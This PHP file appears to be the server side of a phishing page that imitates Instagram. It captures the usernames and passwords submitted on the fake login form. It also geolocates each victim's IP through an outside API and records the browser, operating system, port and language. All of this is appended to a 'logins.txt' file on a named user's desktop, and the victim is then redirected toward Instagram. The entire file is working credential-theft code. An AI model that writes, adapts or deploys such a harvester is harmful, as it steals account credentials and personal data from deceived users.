<?php

function getIpInfo($ip) {
    $apiUrl = "http://ip-api.com/json/{$ip}";
    $apiData = file_get_contents($apiUrl);
    return json_decode($apiData, true);
}

function getBrowserNameAndOs($userAgent) {
    $browser = "Desconhecido";
    if (preg_match('/Firefox/i', $userAgent)) {
        $browser = 'Firefox';
    } elseif (preg_match('/MSIE/i', $userAgent) || preg_match('/Trident/i', $userAgent)) {
        $browser = 'Internet Explorer';
    } elseif (preg_match('/Edge/i', $userAgent)) {
        $browser = 'Microsoft Edge';
    } elseif (preg_match('/Chrome/i', $userAgent)) {
        $browser = 'Google Chrome';
    } elseif (preg_match('/Safari/i', $userAgent)) {
        $browser = 'Safari';
    } elseif (preg_match('/Opera|OPR/i', $userAgent)) {
        $browser = 'Opera';
    }
    
    $os = "Desconhecido";
    if (preg_match('/linux/i', $userAgent)) {
        $os = 'Linux';
    } elseif (preg_match('/macintosh|mac os x/i', $userAgent)) {
        $os = 'MacOS';
    } elseif (preg_match('/windows|win32/i', $userAgent)) {
        $os = 'Windows';
    }
    
    return array($browser, $os);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];
        $dataHora = date('Y-m-d H:i:s');
        $ip = $_SERVER['REMOTE_ADDR'];
        $porta = $_SERVER['REMOTE_PORT'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $linguao = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'N/A';
        list($navegador, $os) = getBrowserNameAndOs($userAgent);
        $ipInfo = getIpInfo($ip);
        
        $protocolo = (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') ? "HTTPS" : "HTTP";

        $conteudo = "🦆 | LOG DUCKETTSTONE\n\n";
        $conteudo .= "📌 | USUARIO: $username\n";
        $conteudo .= "🔑 | SENHA: $password\n";
        $conteudo .= "🏠 | IP: " . $ipInfo['query'] . "\n🔎 | Cidade: " . $ipInfo['city'] . "\n📍 | Região: " . $ipInfo['regionName'] . "\n🌎 | País: " . $ipInfo['country'] . "\n📦 | ISP: " . $ipInfo['isp'] . "\n\n";
        $conteudo .= "🔓 | USER-AGENT: $userAgent\n";
        $conteudo .= "🌐 | NAVEGADOR: $navegador\n";
        $conteudo .= "💻 | SISTEMA OPERACIONAL: $os\n";
        $conteudo .= "🚪 | PORTA: $porta\n";
        $conteudo .= "🔒 | PROTOCOLO: $protocolo\n";
        $conteudo .= "👥 | LINGUAGEM: $linguao\n";
        $conteudo .= "📆 | DATA/HORA: $dataHora\n\n";
        
        // Caminho para salvar o arquivo na área de trabalho do usuário 'marlo'
        $arquivo = 'C:\\Users\\marlo\\Desktop\\logins.txt'; // Caminho para a área de trabalho do usuário 'marlo'

        // Salva o conteúdo no arquivo (adicionando ao final)
        file_put_contents($arquivo, $conteudo, FILE_APPEND);

        // Opcional: Redireciona para o Instagram
        header('Location: Instagram.html'); 
        exit();
    } else {
        echo "Por favor, preencha todos os campos do formulário.";
    }
} else {
    header('Location: https://www.instagram.com/'); 
    exit();
}
?>
